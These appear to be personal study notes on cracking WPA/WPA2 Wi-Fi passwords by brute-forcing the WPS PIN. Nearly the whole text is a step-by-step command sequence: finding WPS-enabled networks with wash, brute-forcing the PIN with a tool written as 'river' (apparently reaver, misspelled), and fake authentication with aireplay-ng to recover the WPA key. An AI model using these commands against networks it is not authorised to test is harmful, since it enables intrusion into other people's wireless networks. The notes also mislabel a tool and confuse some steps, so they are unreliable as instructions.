# Cracking WPA/WPA2 using WPS

1. In practice
```
# 1. Enable the monitor mode

# 2. Check whether the WPS is enabled(Using the tool: wash to display all the network around me that have enabled)

wash --interface [interface name]
# Lck means whether it's locked, cuz some time it will lock after some failures

# 3. Try whether the PBC is enabled
# 3.0) Split the terminal and run river, which is the program that will brute force the pin, which is going to try every simple possible pin until it get the right pin; and only then I will associate with the target because otherwise will fail to associate with my network.

river --bssid [bssid of target] --channel [channel of target] --interface [interface name] -vvv --no-associate
# -vvv: show much info as possible
#--no-associate: tell the river not to associate with the target network

# 3.1) Associate with the network which is exactly the same in WEP

aireplay-ng --fakeauth 30 -a [bssid of target] -h [bssid of interface] [interface name]
# If success, the key shows is after WPA PSK
```
